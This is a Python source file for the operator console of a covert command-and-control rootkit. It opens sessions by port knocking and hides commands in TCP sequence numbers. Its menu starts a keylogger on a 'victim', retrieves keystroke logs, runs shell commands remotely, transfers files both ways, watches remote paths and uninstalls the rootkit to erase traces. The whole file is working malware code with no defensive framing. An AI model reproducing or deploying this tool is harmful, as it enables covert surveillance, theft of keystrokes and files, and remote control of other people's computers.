#!/usr/bin/env python3
import sys
import time
import threading
import socket
import os
import re
from datetime import datetime
from pathlib import Path
from scapy.all import IP, TCP, send, sniff
from port_knocker import PortKnocker

class Commander:
    def __init__(self):
        # Connection state
        self.target_ip = None
        self.tx_port = None
        self.rx_port = None
        self.is_connected = False
        self.knocker = None
        
        # Output handling
        self.output_lock = threading.Lock()
        self.output_buffer = ""
        self.running = True
        
        # Watch-related variables (MUST BE INITIALIZED)
        self.watch_buffer = ""
        self.watch_receiving = False
        self.watch_current_file = None
        self.watch_file_size = 0
        self.watch_event_type = 0
        
        # Watch event types
        self.EVT_CREATED = 1
        self.EVT_MODIFIED = 2
        self.EVT_DELETED = 3
        
        self.EVT_NAMES = {
            1: "CREATED",
            2: "MODIFIED",
            3: "DELETED",
        }
        
        # Dispatch tables for menu actions
        self.disconnected_actions = {
            "1": self.handle_initiate,
            "0": self.handle_exit
        }
        
        self.connected_actions = {
            "1": self.handle_start_keylogger,
            "2": self.handle_stop_keylogger,
            "3": self.handle_get_log,
            "4": self.handle_exec,
            "5": self.handle_put_file,
            "6": self.handle_get_file,
            "7": self.handle_watch,
            "8": self.handle_stop_watch,
            "9": self.handle_uninstall,
            "10": self.handle_disconnect,
            "0": self.handle_exit
        }

    def send_covert_command(self, cmd_type, data=""):
        """Encodes ASCII characters into the TCP Sequence Number."""
        if not self.is_connected:
            print("[!] Not connected. Initiate session first.")
            return False

        payload = f"{cmd_type}:{data}\0"
        for char in payload:
            try:
                pkt = IP(dst=self.target_ip)/TCP(
                    sport=self.rx_port, 
                    dport=self.tx_port, 
                    seq=ord(char), 
                    flags="A"
                )
                send(pkt, verbose=False)
                time.sleep(0.01)
            except Exception as e:
                print(f"[!] Error sending packet: {e}")
                return False
        return True

    def handle_initiate(self):
        """Option 1 (Disconnected): Port knock to initiate session."""
        target_input = input("Target IP [127.0.0.1]: ").strip()
        self.target_ip = target_input if target_input else "127.0.0.1"
        
        try:
            socket.inet_aton(self.target_ip)
        except socket.error:
            print("[!] Invalid IP address.")
            return
        
        print(f"[*] Sending knock sequence to {self.target_ip}...")
        
        self.knocker = PortKnocker(self.target_ip)
        self.tx_port, self.rx_port = self.knocker.execute_knock()
        
        if self.tx_port:
            self.is_connected = True
            threading.Thread(
                target=self.start_output_listener, 
                daemon=True,
                name="OutputListener"
            ).start()
            print(f"\n[+] Covert Channel Established (TX:{self.tx_port} / RX:{self.rx_port})")
            print(f"[+] Connected to {self.target_ip}")
        else:
            print("[!] Knock failed. Check if victim is running.")

    def start_output_listener(self):
        """Continuous sniffer for the RX port to print covert data."""

        self.output_buffer = ""
        self.watch_buffer = ""
        self.watch_receiving = False
        self.watch_current_file = None
        self.watch_file_size = 0
        self.watch_event_type = 0

        def process_packet(pkt):
            if pkt.haslayer(TCP) and pkt[TCP].dport == self.rx_port:

                char_code = pkt[TCP].seq % 256
                if char_code == 0:
                    return

                char = chr(char_code)

                with self.output_lock:

                    # Always append to watch buffer for marker detection
                    self.watch_buffer += char

                    # Detect watch start
                    if "[WATCH FILE]" in self.watch_buffer and not self.watch_receiving:
                        match = re.search(r'\[WATCH FILE\] (.+?)\n', self.watch_buffer)
                        if match:
                            self.watch_receiving = True
                            self.watch_current_file = match.group(1).strip()

                    # Detect event type
                    if "[EVENT]" in self.watch_buffer:
                        match = re.search(r'\[EVENT\] (\d+)\n', self.watch_buffer)
                        if match:
                            self.watch_event_type = int(match.group(1))

                    # Detect size
                    if "[SIZE]" in self.watch_buffer:
                        match = re.search(r'\[SIZE\] (\d+)\n', self.watch_buffer)
                        if match:
                            self.watch_file_size = int(match.group(1))

                    # Detect end of watcher transmission
                    if "[WATCH END]" in self.watch_buffer and self.watch_receiving:

                        self._save_watched_file()

                        # Reset watch state
                        self.watch_buffer = ""
                        self.watch_receiving = False
                        self.watch_current_file = None
                        self.watch_event_type = 0
                        self.watch_file_size = 0

                        return

                    # If not part of watcher traffic, treat as normal output
                    if not self.watch_receiving:
                        self.output_buffer += char

        try:
            sniff(
                filter=f"tcp dst port {self.rx_port}",
                prn=process_packet,
                stop_filter=lambda x: not self.is_connected,
                store=0
            )
        except Exception as e:
            if self.is_connected:
                print(f"\n[!] Listener error: {e}")

    def _snapshot_path(self, relative: str) -> Path:
        """Build a timestamped snapshot filename."""
        rel = Path(relative)
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        name = f"{rel.stem}_{ts}{rel.suffix}"
        watch_root = Path("./watched")
        return watch_root / rel.parent / name

    def _save_watched_file(self):
        """Save received watched file to ./watched/ folder with timestamp."""

        if not self.watch_current_file:
            return

        watch_dir = "./watched"
        os.makedirs(watch_dir, exist_ok=True)

        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        rel = Path(self.watch_current_file)

        snapshot_name = f"{rel.stem}_{ts}{rel.suffix}"
        save_path = os.path.join(watch_dir, snapshot_name)

        content = self.watch_buffer

        content = re.sub(r'\[WATCH FILE\] .+?\n', '', content)
        content = re.sub(r'\[EVENT\] \d+\n', '', content)
        content = re.sub(r'\[SIZE\] \d+\n', '', content)
        content = re.sub(r'\[WATCH END\].*', '', content)

        try:
            with open(save_path, "w") as f:
                f.write(content)

            evt_name = self.EVT_NAMES.get(self.watch_event_type, "MODIFIED")

            print(f"\n[WATCH EVENT] {evt_name}")
            print(f"[+] Snapshot saved: {save_path}\n")

        except Exception as e:
            print(f"\n[!] Error saving watched file: {e}")

    def display_output(self, timeout=3):
        """Wait for and display buffered output."""
        start_time = time.time()
        last_buffer_len = 0
        
        while time.time() - start_time < timeout:
            time.sleep(0.2)
            with self.output_lock:
                if len(self.output_buffer) == last_buffer_len:
                    if last_buffer_len > 0:
                        break
                last_buffer_len = len(self.output_buffer)
        
        with self.output_lock:
            if self.output_buffer:
                print(self.output_buffer, end='')
                self.output_buffer = ""
            else:
                print("[No output]")
        print("="*50 + "\n")

    def handle_start_keylogger(self):
        """Option 1: Start the keylogger on the victim."""
        with self.output_lock:
            self.output_buffer = ""
        print("[*] Starting keylogger on victim...")
        self.send_covert_command("START_KEY")
        self.display_output(timeout=2)

    def handle_stop_keylogger(self):
        """Option 2: Stop the keylogger and delete log file."""
        with self.output_lock:
            self.output_buffer = ""
        print("[*] Stopping keylogger on victim...")
        self.send_covert_command("STOP_KEY")
        self.display_output(timeout=2)

    def handle_get_log(self):
        """Option 3: Transfer the key log file from the victim."""
        with self.output_lock:
            self.output_buffer = ""
        
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        save_dir = "./keylogs"
        os.makedirs(save_dir, exist_ok=True)
        save_path = f"{save_dir}/keylog_{self.target_ip}_{timestamp}.txt"
        
        print(f"[*] Requesting keylog file from {self.target_ip}...")
        self.send_covert_command("GET_LOG")
        
        start_time = time.time()
        last_buffer_len = 0
        timeout = 10
        
        while time.time() - start_time < timeout:
            time.sleep(0.3)
            with self.output_lock:
                current_len = len(self.output_buffer)
                if current_len == last_buffer_len and current_len > 0:
                    break
                last_buffer_len = current_len
        
        with self.output_lock:
            if self.output_buffer:
                content = self.output_buffer.replace("=== KEYLOG START ===\n", "")
                content = content.replace("=== KEYLOG END ===\n", "")
                
                with open(save_path, "w") as f:
                    f.write(content)
                
                print(f"\n[+] Keylog saved to: {save_path}")
                print(f"[+] Total bytes received: {len(content)}")
                self.output_buffer = ""
            else:
                print("\n[!] No keylog data received")
        print("="*50 + "\n")

    def handle_exec(self):
        """Option 4: Run program and display output."""
        cmd = input("shell> ").strip()
        if not cmd:
            return
        
        with self.output_lock:
            self.output_buffer = ""
        
        print(f"[*] Executing '{cmd}' on victim...")
        self.send_covert_command("EXEC", cmd)
        self.display_output(timeout=5)

    def handle_put_file(self):
        """Option 5: Transfer a file TO the victim."""
        filename = input("Local file to upload: ").strip()
        if not filename:
            print("[!] No file specified.")
            return
        if os.path.exists(filename):
            print(f"[*] Uploading {filename} to victim...")
            self.send_covert_command("PUT", filename)
            self.display_output(timeout=2)
        else:
            print(f"[!] File '{filename}' not found.")

    def handle_get_file(self):
        """Option 6: Transfer a file FROM the victim."""
        filename = input("Remote file to download: ").strip()
        if not filename:
            print("[!] No file specified.")
            return
        
        with self.output_lock:
            self.output_buffer = ""
        
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        save_dir = "./transferred_files"
        os.makedirs(save_dir, exist_ok=True)
        remote_filename = os.path.basename(filename)
        save_path = f"{save_dir}/{remote_filename}_{timestamp}"
        
        print(f"[*] Requesting {filename} from victim...")
        self.send_covert_command("GET", filename)
        
        start_time = time.time()
        last_buffer_len = 0
        timeout = 30
        
        while time.time() - start_time < timeout:
            time.sleep(0.3)
            with self.output_lock:
                current_len = len(self.output_buffer)
                if current_len == last_buffer_len and current_len > 0:
                    if "=== FILE TRANSFER COMPLETE ===" in self.output_buffer:
                        break
                    break
                last_buffer_len = current_len
        
        with self.output_lock:
            if self.output_buffer:
                content = self.output_buffer
                content = content.replace("=== FILE TRANSFER START ===\n", "")
                content = content.replace("=== FILE CONTENT ===\n", "")
                content = content.replace("=== FILE TRANSFER COMPLETE ===\n", "")
                
                lines = content.split('\n')
                content_lines = []
                skip_header = True
                for line in lines:
                    if line.startswith("Filename:") or line.startswith("Size:"):
                        continue
                    if skip_header and line == "":
                        continue
                    skip_header = False
                    content_lines.append(line)
                content = '\n'.join(content_lines)
                
                with open(save_path, "w") as f:
                    f.write(content)
                
                print(f"\n[+] File saved to: {save_path}")
                print(f"[+] Total bytes received: {len(content)}")
                self.output_buffer = ""
            else:
                print("\n[!] No file data received")
        print("="*50 + "\n")

    def handle_watch(self):
        """Option 7: Watch a file/directory on the victim."""
        path = input("Remote path to watch: ").strip()
        if not path:
            print("[!] No path specified.")
            return
        
        os.makedirs("./watched", exist_ok=True)
        
        print(f"[*] Watching {path}")
        print(f"[*] Changes will be saved to ./watched/ with timestamps")
        self.send_covert_command("WATCH", path)
        time.sleep(0.5)

    def handle_stop_watch(self):
        """Option 8: Stop watching file/directory on the victim."""
        print("[*] Stopping file watcher on victim...")
        self.send_covert_command("STOP_WATCH", "")
        time.sleep(0.5)
        print("[+] Stop watch signal sent.")

    def handle_uninstall(self):
        """Option 9: Uninstall rootkit from the victim."""
        confirm = input("Are you sure you want to uninstall? (y/n): ").strip().lower()
        if confirm == 'y':
            print("[*] Uninstalling rootkit from victim...")
            print("[*] This will delete all traces on the victim machine")
            self.send_covert_command("UNINSTALL")
            print("[*] Waiting for confirmation...")
            time.sleep(2)
            print("[+] Uninstall signal sent.")
            self.is_connected = False
        else:
            print("[!] Uninstall cancelled.")

    def handle_disconnect(self):
        """Option 10: Disconnect from the victim."""
        print("[*] Disconnecting from victim...")
        self.send_covert_command("EXIT")
        self.is_connected = False
        time.sleep(0.5)
        print("[+] Session closed.")

    def handle_exit(self):
        """Option 0: Exit the commander."""
        if self.is_connected:
            self.handle_disconnect()
        print("[*] Commander exiting.")
        self.running = False
        sys.exit(0)

    def show_disconnected_menu(self):
        print("\n=== Covert C2 Commander ===")
        print("[DISCONNECTED]")
        print("\n1) Initiate session (Port Knock)")
        print("0) Exit")

    def show_connected_menu(self):
        with self.output_lock:
            if self.output_buffer:
                print("\n" + "="*50)
                print(self.output_buffer, end='')
                print("="*50 + "\n")
                self.output_buffer = ""
        
        print(f"\n=== Covert C2 Commander ===")
        print(f"[CONNECTED] -> {self.target_ip}")
        print("\n1. Start Keylogger          6. Transfer File FROM Victim")
        print("2. Stop Keylogger           7. Watch File/Directory")
        print("3. Transfer Keylog File     8. Stop Watch")
        print("4. Run Program on Victim    9. Uninstall Rootkit")
        print("5. Transfer File TO Victim  10. Disconnect")
        print("0. Exit")

    def run(self):
        while self.running:
            if not self.is_connected:
                self.show_disconnected_menu()
                choice = input("\nSelection > ").strip()
                action = self.disconnected_actions.get(choice)
                if action:
                    action()
                else:
                    print("[!] Invalid selection.")
            else:
                self.show_connected_menu()
                choice = input("\nSelection > ").strip()
                action = self.connected_actions.get(choice)
                if action:
                    action()
                else:
                    print("[!] Invalid selection.")

if __name__ == "__main__":
    try:
        cmd = Commander()
        cmd.run()
    except KeyboardInterrupt:
        print("\n[*] Commander interrupted.")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Fatal error: {e}")
        sys.exit(1)
